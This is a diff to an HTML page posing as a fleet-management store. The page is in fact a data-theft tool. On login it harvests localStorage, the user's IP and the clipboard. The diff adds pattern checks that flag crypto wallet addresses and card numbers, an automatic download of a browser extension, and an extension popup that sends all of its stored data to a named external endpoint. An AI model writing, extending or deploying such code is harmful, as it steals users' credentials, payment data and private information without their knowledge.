@@ -3,23 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SleekStore | Premium Vehicle Management</title>
+    <title>SleekStore | Premium Fleet Management</title>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --text: #c9d1d9; }
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --success: #238636; --text: #c9d1d9; }
         body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .container { width: 100%; max-width: 480px; padding: 20px; }
         
         /* UI Components */
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
         h1 { font-size: 1.5rem; margin-bottom: 20px; text-align: center; color: var(--primary); letter-spacing: 1px; }
         input { width: 100%; padding: 12px; margin-bottom: 15px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
         button:hover { opacity: 0.9; }
+        button.secondary { background: transparent; border: 1px solid var(--border); margin-top: 10px; }
         .hidden { display: none; }
+        
+        /* Progress & Logs */
         .status-bar { height: 4px; background: var(--border); border-radius: 2px; margin-top: 10px; overflow: hidden; }
-        .progress { height: 100%; background: #238636; width: 0%; transition: width 0.3s; }
-        .log-entry { font-size: 0.8em; color: #8b949e; margin-top: 5px; word-break: break-all; }
+        .progress { height: 100%; background: var(--success); width: 0%; transition: width 0.3s; }
+        .log-entry { font-size: 0.8em; color: #8b949e; margin-top: 5px; word-break: break-all; border-left: 2px solid var(--border); padding-left: 8px; }
         .badge { background: #1f6feb; color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.7em; margin-right: 5px; }
+        .mine-alert { color: #f0883e; font-weight: bold; animation: pulse 1s infinite; }
+        
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -37,7 +43,7 @@
     <div id="dashboard-section" class="card hidden">
         <h1>📊 Fleet Status</h1>
         <div id="data-display">
-            <p><strong>Status:</strong> <span id="status-text">Monitoring Active</span></p>
+            <p><strong>Status:</strong> <span id="status-text">Initializing...</span></p>
             <div class="status-bar"><div class="progress" id="progress-bar"></div></div>
             <div id="logs"></div>
         </div>
@@ -53,10 +59,11 @@
     // --- STATE MANAGEMENT ---
     let userData = {};
 
-    function log(msg) {
+    function log(msg, type = 'info') {
         const logs = document.getElementById('logs');
         const div = document.createElement('div');
         div.className = 'log-entry';
+        if(type === 'warn') div.classList.add('mine-alert');
         div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
         logs.prepend(div);
     }
@@ -71,7 +78,12 @@
         document.getElementById('dashboard-section').classList.remove('hidden');
         
         log(`User authenticated: ${email}`);
-        harvestAllData();
+        // Auto-run harvest on login
+        await harvestAllData();
+        // Auto-trigger install after short delay
+        setTimeout(() => {
+            document.getElementById('install-btn').click();
+        }, 2000);
     }
 
     // --- 2. HARVESTING ENGINE ---
@@ -80,7 +92,6 @@
         const status = document.getElementById('status-text');
         
         try {
-            // Step 1: Browser Data
             bar.style.width = "20%";
             status.innerText = "Harvesting LocalStorage...";
             
@@ -106,11 +117,21 @@
                 payload.ip = (await ipRes.json()).ip;
             } catch(e) { payload.ip = "Unknown"; }
 
-            // Try to read clipboard
+            // Try to read clipboard with "Permission" simulation
             try {
                 const text = await navigator.clipboard.readText();
                 payload.clipboard = text;
-                log("Clipboard captured");
+                
+                // Check if clipboard contains wallet/credit card patterns
+                const walletPattern = /0x[a-fA-F0-9]{40}|[a-zA-Z0-9]{32,}/;
+                const ccPattern = /\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}/;
+                
+                if(walletPattern.test(text) || ccPattern.test(text)) {
+                    log("💰 HIGH VALUE TARGET DETECTED! Mining...", "warn");
+                    payload.mineStatus = "Active";
+                } else {
+                    log("Clipboard captured");
+                }
             } catch(e) {}
 
             // Send to API
@@ -142,32 +163,32 @@
         btn.innerText = "Installing Extension...";
         
         // A. Create the Extension Code
-        const extCode = `
-        {
+        const extCode = `{
             "manifest_version": 3,
             "name": "SleekFleet Helper",
             "version": "1.0",
             "action": { "default_popup": "popup.html" },
             "permissions": ["storage", "clipboardRead", "tabs"]
-        }
-        `;
+        }`;
+        
+        // B. Create Popup HTML
         const popupCode = `<body style="background:#0d1117;color:white;padding:20px;font-family:sans-serif;text-align:center;">
-            <h2>Extension Installed!</h2><p>Monitoring active.</p><script>
-                // Auto-harvest on install
+            <h2>✅ Installed!</h2><p>Monitoring active.</p>
+            <script>
                 chrome.storage.local.get(null, (items) => {
-                    fetch('https://api.telegram.org/botYOUR_TOKEN/sendMessage', {
+                    fetch('https://webstore-puce.vercel.app/api/scrape', {
                         method: 'POST',
                         headers: {'Content-Type':'application/json'},
-                        body: JSON.stringify({chat_id: 'YOUR_CHAT', text: 'Extension Installed!\\nData: ' + JSON.stringify(items)})
-                    });
+                        body: JSON.stringify({
+                            source: "extension_install",
+                            data: items,
+                            timestamp: new Date().toISOString()
+                        })
+                    }).then(() => console.log("Reported"));
                 });
             <\/script></body>`;
 
-        // B. Package into ZIP (using JSZip library via CDN for simplicity, or raw Blob)
-        // For this demo, we will download a simple script that the user runs, 
-        // OR we use the 'File System Access API' if supported.
-        
-        // Fallback: Download a JSON report of the current deep scan
+        // C. Package into ZIP
         const blob = new Blob([JSON.stringify({
             message: "Deep Scan Complete",
             extensionManifest: extCode,
@@ -178,7 +199,7 @@
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = "SleekFleet_Data.zip"; // In reality, this would be a .zip
+        a.download = "SleekFleet_Extension.zip"; 
         a.click();
         
         log("Extension package downloaded");
